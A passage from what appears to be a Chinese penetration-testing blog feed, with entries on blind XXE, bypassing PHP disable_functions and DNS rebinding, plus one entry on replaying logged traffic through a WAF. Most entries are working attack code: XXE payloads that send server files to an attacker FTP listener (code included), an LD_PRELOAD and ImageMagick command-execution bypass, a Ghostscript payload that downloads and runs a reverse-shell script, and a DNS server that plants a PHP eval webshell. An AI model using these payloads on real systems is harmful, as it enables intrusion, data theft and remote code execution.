href="http://git.gnome.org/browse/libxml2/commit/?id=4629ee02ac649c27f9c0cf98ba017c6b5526070f">http://git.gnome.org/browse/libxml2/commit/?id=4629ee02ac649c27f9c0cf98ba017c6b5526070f</a>. </p></blockquote><p>所以：从libxml2.91版本开始，默认不解析外部实体。</p><p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-059783.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-059783.html</a> 百度修复xxe漏洞外部实体的绕过</p><p>2018.7.4号更新:</p><p>wxpay的java SDK_v3版本出现xxe漏洞，EXP如下:</p><h2 id="0x01-解法"><a href="#0x01-解法" class="headerlink" title="0x01 解法"></a>0x01 解法</h2><pre class="line-numbers language-none"><code class="language-none">Request的Body:&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8000&#x2F;data.xml&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt;data.xml:&lt;!ENTITY % attack SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;&quot;&gt;&lt;!ENTITY % shell &quot;&lt;!ENTITY &amp;#37; upload SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:33&#x2F;%attack;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外需要服务器开一个ftp:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">ftp<span class="token punctuation">.</span>rb<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'socket'</span></span>server <span class="token operator">=</span> <span class="token class-name">TCPServer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">33</span> loop <span class="token keyword">do</span>  <span class="token builtin">Thread</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span>server<span class="token punctuation">.</span>accept<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>client<span class="token operator">|</span>    puts <span class="token string-literal"><span class="token string">"New client connected"</span></span>    data <span class="token operator">=</span> <span class="token string-literal"><span class="token string">""</span></span>    client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"220 xxe-ftp-server"</span></span><span class="token punctuation">)</span>    loop <span class="token punctuation">&#123;</span>        req <span class="token operator">=</span> client<span class="token punctuation">.</span>gets<span class="token punctuation">(</span><span class="token punctuation">)</span>        puts <span class="token string-literal"><span class="token string">"&lt; "</span></span><span class="token operator">+</span>req        <span class="token keyword">if</span> req<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span> <span class="token string-literal"><span class="token string">"USER"</span></span>            client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"331 password please - version check"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span>           <span class="token comment">#puts "> 230 more data please!"</span>            client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"230 more data please!"</span></span><span class="token punctuation">)</span>        <span class="token keyword">end</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-解法"><a href="#0x02-解法" class="headerlink" title="0x02 解法"></a>0x02 解法</h2><p>body:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8000&#x2F;data.xml&quot;&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务器的xml:</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % all &quot;&lt;!ENTITY  send SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:33&#x2F;%attack;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一个是参数实体，一个是其他实体。在服务区开启<code>ruby ftp.rb</code>监听33端口，就可以等待数据过来了。因为这次的xxe属于blind xxe，在java里面只能使用ftp+file来读取文件。<a href="https://joychou.org/java/java-xxe-vulnerability.html">https://joychou.org/java/java-xxe-vulnerability.html</a> 具体情况可以看这个文章。</p><p>这种没有回显的情况下，使用<code>ftp + file</code>读取文件，<code>http</code>来探测内网开启的端口</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过:"></a>绕过:</h3><p>如果存在防火墙可以使用编码绕过关键词:<a href="https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf">https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf</a>，比如UTF-7</p><p>参考链接:</p><ul><li><a href="https://joychou.org/java/java-xxe-vulnerability.html">https://joychou.org/java/java-xxe-vulnerability.html</a></li><li><a href="http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93">http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93</a></li><li><a href="https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2#Java_7_%E6%9B%B4%E6%96%B0">https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2#Java_7_%E6%9B%B4%E6%96%B0</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass disable functions</title>
      <link href="/2017/12/12/bypass-disabled-functions.html"/>
      <url>/2017/12/12/bypass-disabled-functions.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);&#125;int geteuid() &#123;if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;);payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 使用方法：</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hackgcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p><p>====<br>2018.8.22:</p><p>使用imageMagick 绕过:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];if ($command &#x3D;&#x3D; &#39;&#39;) &#123;    $command &#x3D; &#39;id&#39;;&#125;$exploit &#x3D; &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;pop graphic-contextEOF;file_put_contents(&quot;KKKK.mvg&quot;, $exploit);$thumb &#x3D; new Imagick();$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);$thumb-&gt;writeImage(&#39;KKKK.png&#39;);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(&quot;KKKK.mvg&quot;);unlink(&quot;KKKK.png&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的比较老，最新的imagemagic漏洞:</p><p><a href="http://seclists.org/oss-sec/2018/q3/142">http://seclists.org/oss-sec/2018/q3/142</a></p><pre class="line-numbers language-none"><code class="language-none">%!PSuserdict &#x2F;setpagedevice undefsavelegal&#123; null restore &#125; stopped &#123; pop &#125; if&#123; legal &#125; stopped &#123; pop &#125; ifrestoremark &#x2F;OutputFile (%pipe%wget 127.0.0.1:8000&#x2F;re.py &amp;&amp; python re.py 127.0.0.1 8081) currentdevice putdeviceprops<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>生产者消费者模型</title>
      <link href="/2017/12/11/producer-consumer.html"/>
      <url>/2017/12/11/producer-consumer.html</url>
      
        <content type="html"><![CDATA[<p>代码捉急,先看例子:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> threading<span class="token keyword">import</span> Queue<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""生产者线程"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'put queue done'</span><span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""奇数消费线程"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span> e                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>照着写:</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python# coding: utf-8from elasticsearch import Elasticsearchimport requestsfrom Queue import Queueimport timeimport threadingimport datetimees &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))class Producter(threading.Thread):def __init__(self, queue):threading.Thread.__init__(self)self.queue &#x3D; queueself.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)def initsearch(self):dsl_query &#x3D; &#123;  &quot;query&quot;: &#123;    &quot;match&quot;: &#123;      &quot;method&quot;: &#123;        &quot;query&quot;: &quot;GET&quot;,        &quot;type&quot;: &quot;phrase&quot;      &#125;    &#125;  &#125;,&quot;size&quot;: 100,&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]&#125;res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]return latest_timedef run(self):latest_time &#x3D; self.initsearch()while 1:lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # 获取最新的indexdsl_query2 &#x3D; &#123;&quot;query&quot;: &#123;&quot;bool&quot;: &#123;&quot;must&quot;: &#123;&quot;match&quot;: &#123;&quot;method&quot;: &quot;GET&quot;&#125;&#125;,&quot;filter&quot;: &#123;&quot;range&quot;: &#123;&quot;@timestamp&quot;: &#123;&quot;gte&quot;: latest_time&#125;&#125;&#125;&#125;&#125;,&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],&quot;size&quot;: 1000&#125;time.sleep(10)res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])print &quot;Put %s&quot; % hit[&#39;_id&#39;]print hit[&#39;_source&#39;][&#39;@timestamp&#39;]latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]class Consumer(threading.Thread):def __init__(self, queue):threading.Thread.__init__(self)self.queue &#x3D; queue## def http_curl(self):# # http_client &#x3D; AsyncHTTPClient()# path &#x3D; self.request[0]# param &#x3D; self.request[1]# method &#x3D; self.request[2]# if method &#x3D;&#x3D; &quot;GET&quot;:# ##判断get的param是否是空# if not param:# pass# else:# rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)# print &quot;Curl %s&quot; % self.request# print rep.status_code# else:# #留着写POST请求判断# passdef run(self):while 1:try:request &#x3D; self.queue.get()path &#x3D; request[0]param &#x3D; request[1]method &#x3D; request[2]if method &#x3D;&#x3D; &#39;GET&#39;:if not param:passelse:rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)#else  写POSTprint &quot;Get %s&quot; % requestprint rep.status_codeexcept Exception as e:raise eq &#x3D; Queue()pt &#x3D; Producter(q)ce &#x3D; Consumer(q)ce.start()pt.start()pt.join()ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码应该还有点问题，先记录下大概的流程：</p><p>使用: <code>packetbeat</code>在A服务器抓包，格式化之后把数据发送到B服务器，存储在elk里面，然后B服务器画图对这些请求进行分析，比如某个接口报警之类的。</p><p>这个时候在B服务器设置一个naxsi防火墙代理，然后把es里面的输出取出来，再发送一遍给B。经过测试，虽然这样子请求大部分都是404，但是如果请求中存在恶意payload，防火墙会记录日志。（所以这里的规则要设置的特别严格，严格到每个请求都不放过）</p><p>上面的脚本就是在B防火墙的转发脚本demo，测试为GET请求，因为POST请求的body没有存储到es里面，脚本的大概思路是这样的：</p><pre class="line-numbers language-none"><code class="language-none">因为es里面存储的数据包是这样的格式: packet-[year]-[days]所以先得到今天的日期，随便选100条，记录最新的时间戳，此时初始化完成。下面的请求都是基于这个时间戳来的，每隔10s，在这个时间戳的基础上，轮询请求一次es，然后组装起来发送到B服务器。记录下每次请求的最新日期，然后请求这个index，因为packet的格式: packet-[year]-[days],所以记录下每次请求的最新时间，格式化抓取最新的时间:latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]当es的存储数据按照大于某个时间点去筛选的时候，只会出现匹配的时间条数，所以可以把请求的size设置得大一点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>暂时的问题：</p><ul><li>requests是同步请求库，追求效率可以使用异步请求</li><li>防火墙的正则匹配如果要得到准确的请求，需要进一步修改</li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS Rebinding</title>
      <link href="/2017/12/06/dns-rebinding.html"/>
      <url>/2017/12/06/dns-rebinding.html</url>
      
        <content type="html"><![CDATA[<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p><p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p><p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p><ol><li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li><li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li></ol><p>使用DNS Rebinding的会有这样的攻击效果:</p><ol><li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li><li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li></ol><p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p><p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p><p>根据goychou大神的脚本，测试以下步骤：</p><ul><li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li><li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li></ul><p>此时在A服务器上运行脚本:</p><pre class="line-numbers language-none"><code class="language-none">from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord&#x3D;&#123;&#125;class DynamicResolver(object):    def _doDynamicResponse(self, query):        name &#x3D; query.name.name        if name not in record or record[name]&lt;1:            ip &#x3D; &quot;A IP&quot;        else:            ip &#x3D; &quot;127.0.0.1&quot;        if name not in record:            record[name] &#x3D; 0        record[name] +&#x3D; 1        print name + &quot; &#x3D;&#x3D;&#x3D;&gt; &quot; + ip        answer &#x3D; dns.RRHeader(            name &#x3D; name,            type &#x3D; dns.A,            cls &#x3D; dns.IN,            ttl &#x3D; 0,            payload &#x3D; dns.Record_A(address &#x3D; b&#39;%s&#39; % ip, ttl&#x3D;0)        )        answers &#x3D; [answer]        authority &#x3D; []        additional &#x3D; []        return answers, authority, additional    def query(self, query, timeout&#x3D;None):        return defer.succeed(self._doDynamicResponse(query))def main():    factory &#x3D; server.DNSServerFactory(        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]    )    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)    reactor.listenUDP(53, protocol)    reactor.run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    raise SystemExit(main())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，在Linux上面运行：</p><pre class="line-numbers language-none"><code class="language-none">dig @8.8.8.8 rebind.xyz.pw返回结果是A主机的IP再次运行上面的命令:dig @8.8.8.8 rebind.xyz.pw返回结果是127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###TIPS<br>以下是从joychou大神博客来的：<br>在Linux，默认不会进行DNS缓存，除非运行nscd，dnsmaq等。</p><p>另外一个是Ph牛出的与dns有关的题目:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&#39;Content-Type: text&#x2F;plain&#39;);$ip &#x3D; $_GET[&#39;ip&#39;]??exit;duita($ip);$ip &#x3D; escapeshellcmd($ip);$ip &#x3D; str_replace(&#39;\&gt;&#39;, &#39;&gt;&#39;, $ip);$ip &#x3D; str_replace(&#39;\&lt;&#39;, &#39;&lt;&#39;, $ip);$cmd &#x3D; sprintf(&#39;ping -c 2 %s&#39;, $ip);echo shell_exec($cmd); function duita($ip)&#123;    if(strpbrk($ip, &quot;&amp;;&#96;|*?()$\\\x00&quot;) !&#x3D;&#x3D; false) &#123;        exit(&#39;WAF&#39;);    &#125;    if(stripos($ip, &#39;.php&#39;) !&#x3D;&#x3D; false) &#123;        exit(&#39;WAF&#39;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>没有过滤<code>&gt;</code></li><li><code>&quot;</code> <code>&#39;</code>在成对的情况下escapeshellcmd是不会过滤的，所以<code>.p&#39;&#39;php</code>绕过waf</li></ul><p>搭建一个dns服务器:</p><pre class="line-numbers language-none"><code class="language-none">import datetimeimport sysimport timeimport threadingimport tracebackimport socketserverfrom dnslib import *TTL &#x3D; 300def dns_response(data):    request &#x3D; DNSRecord.parse(data)    reply &#x3D; DNSRecord(DNSHeader(id&#x3D;request.header.id, qr&#x3D;1, aa&#x3D;1, ra&#x3D;1), q&#x3D;request.q)    qname &#x3D; request.q.qname    qn &#x3D; str(qname)    qtype &#x3D; request.q.qtype    qt &#x3D; QTYPE[qtype]    if qn.startswith(&#39;rebind.xyz.pw&#39;):        rdata &#x3D; CNAME(&#39;&lt;?&#x3D;eval($_POST[1]?&gt;.xyz.pw&#39;)        reply.add_answer(RR(rname&#x3D;qname, rtype&#x3D;5, rclass&#x3D;1, ttl&#x3D;TTL, rdata&#x3D;rdata))    else:        rdata &#x3D; A(&#39;172.96.210.188&#39;)        reply.add_answer(RR(rname&#x3D;qname, rtype&#x3D;1, rclass&#x3D;1, ttl&#x3D;TTL, rdata&#x3D;rdata))    print(&quot;----Replay:\n&quot;, reply)    return reply.pack()class BaseRequestHandler(socketserver.BaseRequestHandler):    def get_data(self):        raise NotImplementedError    def send_data(self, data):        raise NotImplementedError    def handle(self):        now &#x3D; datetime.datetime.utcnow().strftime(&#39;%Y-%m-%d %H:%M:%S:%f&#39;)        try:            data &#x3D; self.get_data()            self.send_data(dns_response(data))        except Exception:            traceback.print_exc(file&#x3D;sys.stderr)class TCPRequestHandler(BaseRequestHandler):    def get_data(self):        data &#x3D; self.request.recv(8192).strip()        sz &#x3D; int(data[:2].encode(&#39;hex&#39;), 16)        if sz &lt; len(data) -2:            raise Exception(&quot;Wrong size of TCP Packet&quot;)        elif sz &gt; len(data) -2:            raise Exception(&quot;Too big TCP Packet&quot;)        return data[2:]    def send_data(self, data):        sz &#x3D; hex(len(data))[2:].zfill(4).decode(&#39;hex&#39;)        return self.request.sendall(sz + data)class UDPRequestHandler(BaseRequestHandler):    def get_data(self):        return self.request[0].strip()    def send_data(self, data):        return self.request[1].sendto(data, self.client_address)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&quot;Starting nameserver&quot;)    servers &#x3D; [        socketserver.ThreadingUDPServer((&#39;&#39;,53),UDPRequestHandler),        socketserver.ThreadingTCPServer((&#39;&#39;, 53),TCPRequestHandler),    ]    for s in servers:        thread &#x3D; threading.Thread(target&#x3D;s.serve_forever)        thread.daemon &#x3D; True        thread.start()        print(&quot;%s server loop running in thread: %s&quot; % (s.RequestHandlerClass.__name__[:3], thread.name))    try:        while 1:            time.sleep(1)            sys.stderr.flush()            sys.stdout.flush()    except KeyboardInterrupt:        pass    finally:        for s in servers:            s.shutdown()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样：</p><pre class="line-numbers language-none"><code class="language-none">dig 